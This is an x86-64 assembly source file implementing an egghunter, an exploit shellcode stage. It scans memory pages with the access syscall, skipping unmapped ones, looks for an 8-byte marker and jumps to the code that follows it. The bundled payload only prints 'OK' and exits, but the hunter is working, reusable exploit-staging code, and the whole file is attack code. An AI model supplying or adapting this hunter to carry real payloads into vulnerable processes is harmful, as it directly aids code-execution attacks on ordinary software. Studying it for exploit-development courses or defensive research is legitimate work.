global _start
section .text

_start:	
	mov ebx, 0xfceb02eb
	push rbx
	shl rbx, 32
	or rbx, [rsp]
	xor rdx, rdx
	push rdx 
	mov dh, 0x10	; RDX = 0x1000 (PAGE_SIZE)
	pop rdi			; zero RDI
	push rdi
	pop rsi
	
_page_test:
	push 0x15
	pop rax
	syscall
	cmp al, -14
	jne short _egg_test_start
	add rdi, rdx
	jmp short _page_test
	
_egg_test_start:
	push rdx		; 0xff8 loop count
	pop rcx
	sub ecx, 8
	
_egg_test:
	cmp rbx, [rdi]
	je short _found
	inc rdi
	loop _egg_test
	add rdi, 8
	jmp short _page_test
	
_found:
	jmp rdi
	
section .data
	_garbage_pad: db 0x41, 0x90
	_egg: db 0xeb, 0x02, 0xeb, 0xfc, 0xeb, 0x02, 0xeb, 0xfc, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x5f, 0xff, 0xc0, 0x48, 0x83, 0xc2, 0x08, 0x68, 0x4f, 0x4b, 0x20, 0x0a, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x6a, 0x3c, 0x58, 0x0f, 0x05
